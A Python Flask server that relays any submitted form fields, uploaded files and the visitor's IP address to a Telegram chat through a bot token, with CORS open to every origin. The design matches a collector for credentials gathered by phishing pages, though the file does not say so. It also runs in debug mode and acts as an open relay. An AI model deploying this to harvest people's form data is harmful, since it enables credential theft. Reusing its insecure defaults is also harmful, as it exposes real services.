import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Increase max content length (e.g. 50MB — Telegram's bot API hard limit)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50MB

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".webp", ".gif"}
VIDEO_EXTENSIONS = {".mp4", ".mov", ".avi", ".mkv", ".webm"}
AUDIO_EXTENSIONS = {".mp3", ".ogg", ".wav", ".m4a", ".flac"}


def get_extension(filename: str) -> str:
    return os.path.splitext(filename)[1].lower()


def send_file_to_telegram(chat_id: str, file_key: str, file) -> dict:
    """
    Routes the file to the correct Telegram endpoint based on type.
    Falls back to sendDocument for anything unrecognized.
    """
    filename = file.filename
    ext = get_extension(filename)
    file_bytes = file.read()  # Read once into memory

    base_data = {"chat_id": chat_id}

    if ext in IMAGE_EXTENSIONS:
        # Use sendPhoto for images ≤ 10MB, otherwise sendDocument
        if len(file_bytes) <= 10 * 1024 * 1024:
            resp = requests.post(
                f"{TG_API}/sendPhoto",
                data=base_data,
                files={"photo": (filename, file_bytes, file.content_type)},
            )
        else:
            resp = requests.post(
                f"{TG_API}/sendDocument",
                data=base_data,
                files={"document": (filename, file_bytes, file.content_type)},
            )

    elif ext in VIDEO_EXTENSIONS:
        resp = requests.post(
            f"{TG_API}/sendVideo",
            data=base_data,
            files={"video": (filename, file_bytes, file.content_type)},
        )

    elif ext in AUDIO_EXTENSIONS:
        resp = requests.post(
            f"{TG_API}/sendAudio",
            data=base_data,
            files={"audio": (filename, file_bytes, file.content_type)},
        )

    else:
        # PDFs, ZIPs, DOCX, etc.
        resp = requests.post(
            f"{TG_API}/sendDocument",
            data=base_data,
            files={"document": (filename, file_bytes, file.content_type)},
        )

    return resp.json()


@app.route("/", methods=["GET"])
def home():
    return "Server running"


@app.route("/send", methods=["POST"])
def send():
    chat_id = request.form.get("chat_id")
    if not chat_id:
        return jsonify({"error": "chat_id missing"}), 400

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # -------- TEXT MESSAGE --------
    text_lines = ["📱 *New Submission*", f"🌐 IP: `{user_ip}`", ""]
    for key in request.form:
        if key != "chat_id":
            text_lines.append(f"*{key}:* {request.form.get(key)}")

    requests.post(
        f"{TG_API}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": "\n".join(text_lines),
            "parse_mode": "Markdown",
        },
    )

    # -------- FILES --------
    results = []
    for file_key in request.files:
        file = request.files[file_key]
        if file.filename:
            result = send_file_to_telegram(chat_id, file_key, file)
            results.append({"file": file.filename, "tg_response": result})

    return jsonify({"ok": True, "files": results})


# -------- Error handler for files that exceed MAX_CONTENT_LENGTH --------
@app.errorhandler(413)
def too_large(e):
    return jsonify({"error": "File too large. Telegram Bot API limit is 50MB."}), 413


if __name__ == "__main__":
    app.run(debug=True)